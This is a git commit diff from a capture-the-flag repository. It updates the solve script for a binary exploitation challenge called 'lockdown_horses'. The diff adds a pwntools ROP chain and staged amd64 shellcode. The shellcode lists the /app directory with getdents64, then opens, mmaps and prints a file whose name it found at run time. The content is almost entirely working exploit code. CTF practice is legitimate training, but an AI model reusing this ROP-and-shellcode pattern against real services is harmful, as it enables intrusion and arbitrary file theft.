84b9595a2db60e6f6b4f78d9701e5795aae79438
Minh Nhat Nguyen <mnhatnguyen06@gmail.com>
2026-06-20 08:20:30 +0000

    Locate flag and print flag lockdown_horses

--- pwn/lockdown_horses/a.py
+++
@@ -1,6 +0,0 @@
-from pwn import *
-
-context.arch='amd64'
-
-sh = shellcraft.amd64.linux.getdents64(3, 0x100000, 0x1000)
-print(sh)
--- pwn/lockdown_horses/solve.py
+++ pwn/lockdown_horses/solve.py
@@ -64,9 +64,89 @@ payload = flat([
     p64(strlen_plt),
     p64(pop_rdi) + p64(0),
     p64(pop_rsi_r15) + p64(0x10000) + p64(0),
-    p64(read_plt)
+    p64(read_plt),
+    p64(0x10000)
 ])
 
 r.send(payload)
+
+sh = asm('''
+    mov rax, 0x2f7070612f
+    push rax
+    mov rdi, rsp
+    mov rax, 2
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+
+    mov rdi, rax
+    xor rax, rax
+    mov rax, 217
+    mov rsi, 0x100000
+    mov rdx, 0x1000
+    syscall
+
+    xor rax, rax
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, 0x100000
+    mov rdx, 0x1000
+    syscall
+
+    xor rax, rax
+    mov rax, 0
+    mov rdi, 0
+    mov rsi, 0x10000+0x1000
+    mov rdx, 0x1000
+    syscall
+''')
+
+r.send(sh.ljust(0x1000, b'\x90'))
+r.recvuntil('flag')
+flag = r.recvuntil('.txt').strip().decode()
+flag = 'flag' + flag
+flag_path = f'/app/{flag}'[::-1].encode().hex()
+
+sh = asm(f'''
+    mov rax, 0x{flag_path[:4]}
+    push rax
+    mov rax, 0x{flag_path[4:20]}
+    push rax
+    mov rax, 0x{flag_path[20:36]}
+    push rax
+    mov rax, 0x{flag_path[36:52]}
+    push rax
+    mov rax, 0x{flag_path[52:68]}
+    push rax
+    mov rax, 0x{flag_path[68:84]}
+    push rax
+    mov rax, 0x{flag_path[84:100]}
+    push rax
+    mov rdi, rsp
+    xor rax, rax
+    mov rax, 2
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+
+    mov r8, rax
+    xor rax, rax
+    mov rax, 9
+    mov rdi, 0x20000
+    mov rsi, 0x100
+    mov rdx, 1
+    mov r10, 2
+    mov r9, 0
+    syscall
+
+    mov rsi, rax
+    xor rax, rax
+    mov rax, 1
+    mov rdi, 1
+    mov rdx, 0x100
+    syscall
+''')
+r.recv(0x10000)
+r.send(sh)
 
 r.interactive()
